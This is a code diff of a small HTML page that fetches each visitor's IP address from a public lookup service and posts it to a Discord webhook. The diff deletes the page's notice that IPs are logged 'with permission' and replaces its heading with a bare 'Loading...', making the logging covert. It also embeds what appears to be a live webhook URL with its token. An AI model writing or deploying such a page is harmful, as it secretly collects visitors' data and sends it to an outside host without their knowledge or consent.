@@ -1,31 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>IP Logger Example</title>
+  <title>IP Logger</title>
 </head>
 <body>
-  <h1>Welcome!</h1>
-  <p>Your IP will be logged with permission.</p>
-
+  <h1>Loading...</h1>
   <script>
-    // Fetch the user's IP address using a public API
+    const webhookURL = 'https://discord.com/api/webhooks/1397430499613343794/O2u463okQtTunWUCti3_d3vnaN436ozmLt80XVWmr_SDskIvsZXSnUiDaRPahxSmbc9O';
+
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
-
-        // Send the IP to your Discord webhook
-        fetch('https://discord.com/api/webhooks/1397430499613343794/O2u463okQtTunWUCti3_d3vnaN436ozmLt80XVWmr_SDskIvsZXSnUiDaRPahxSmbc9O', {
+        fetch(webhookURL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `Visitor IP: ${ip}`
-          })
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({content: `Visitor IP: ${ip}`})
         });
       })
-      .catch(err => {
-        console.error('Error fetching IP:', err);
-      });
+      .catch(console.error);
   </script>
 </body>
 </html>
